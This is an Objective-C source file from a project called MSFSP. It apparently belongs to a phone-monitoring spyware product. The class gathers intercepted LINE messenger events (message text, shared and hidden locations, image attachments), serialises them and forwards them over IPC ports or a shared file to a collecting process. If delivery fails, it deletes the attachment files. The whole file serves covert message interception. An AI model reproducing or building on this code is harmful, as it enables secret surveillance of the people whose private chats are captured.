//
//  LineEventSenderOperation.m
//  MSFSP
//
//  Created by Benjawan Tanarattanakorn on 4/22/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "LINEEventSenderOperation.h"

#import "LINEUtils.h"

#import "StringUtils.h"
#import "FxIMEvent.h"
#import "DefStd.h"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"

@implementation LINEEventSenderOperation


- (id) initWithIMEvent: (FxIMEvent *) aIMEvent {
	self = [super init];
	if (self != nil) {
		mIMEvent = [aIMEvent retain];		
	}
	return self;
}

- (void) sendEvent: (NSData *) aData {
	
}

// required method for NSOperation
- (void) main {
	DLog (@"====> line operation thread %@, priority %f", [NSThread currentThread], [NSThread threadPriority])
	NSAutoreleasePool* pool = [[NSAutoreleasePool alloc] init];
	
	if (mIMEvent) {
		@try {	
			NSString *msg = [StringUtils removePrivateUnicodeSymbols:[mIMEvent mMessage]];
			DLog(@"LINE message after remove emoji = %@", msg);
            DLog(@"attachment %@ count %lu", [mIMEvent mAttachments], (unsigned long)[[mIMEvent mAttachments] count])
			if ([msg length]															||	// for Text
				//[mIMEvent mRepresentationOfMessage] == kIMMessageShareLocation			||	// for Share location
                [mIMEvent mRepresentationOfMessage] & kIMMessageShareLocation			||	// for Shared location and hidden shared location
				([mIMEvent mAttachments] && [[mIMEvent mAttachments] count] != 0)		){	// for Image
				
				[mIMEvent setMMessage:msg];
				
                DLog(@"!!!!!! GOING TO SEND LINE !!!!!!!")
				NSMutableData* data			= [[NSMutableData alloc] init];				
				NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
				[archiver encodeObject:mIMEvent forKey:kLINEArchived];
				[archiver finishEncoding];
				[archiver release];	
				
				if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
					// -- first port ----------
					MessagePortIPCSender *messagePortSender1 = [[MessagePortIPCSender alloc] initWithPortName:kLINEMessagePort1];			
					BOOL isSendingOK = [messagePortSender1 writeDataToPort:data];
					DLog (@"Sending to first port %d", isSendingOK)
					
					if (!isSendingOK) {
						DLog (@"First sending LINE fail");		
						
						// -- second port ----------
						MessagePortIPCSender *messagePortSender2 = [[MessagePortIPCSender alloc] initWithPortName:kLINEMessagePort2];
						isSendingOK = [messagePortSender2 writeDataToPort:data];
						if (!isSendingOK) {
							DLog (@"Second sending LINE also fail");	
																		
							// -- Third port ----------												
							[NSThread sleepForTimeInterval:3];
							
							MessagePortIPCSender *messagePortSender3 = [[MessagePortIPCSender alloc] initWithPortName:kLINEMessagePort3];
							isSendingOK = [messagePortSender3 writeDataToPort:data];
							if (!isSendingOK) {							
								DLog (@"Third sending LINE also fail");							
								[LINEUtils deleteAttachmentFileAtPathForEvent:[mIMEvent mAttachments]];			
							}						
						}
						[messagePortSender2 release];
					}
					
					[messagePortSender1 release];
				} else {
					SharedFile2IPCSender *sharedFileSender = [[LINEUtils shareLINEUtils] mIMSharedFileSender];
					BOOL isSendingOK = [sharedFileSender writeDataToSharedFile:data];
					if (!isSendingOK) {							
						DLog (@"Shared file sending LINE is fail");							
						[LINEUtils deleteAttachmentFileAtPathForEvent:[mIMEvent mAttachments]];			
					}
				}
				
				[data release];							
			}
		}
		@catch (NSException * e) {
			;
		}
		@finally {
			;
		}
		
	}
	DLog (@"====> END of line operation thread %@", [NSThread currentThread])
	[pool release];
}

- (void) dealloc {
	DLog (@"dealloc of Line NSOperation")
	
	if (mIMEvent)
		[mIMEvent release];
	
	[super dealloc];
}

@end
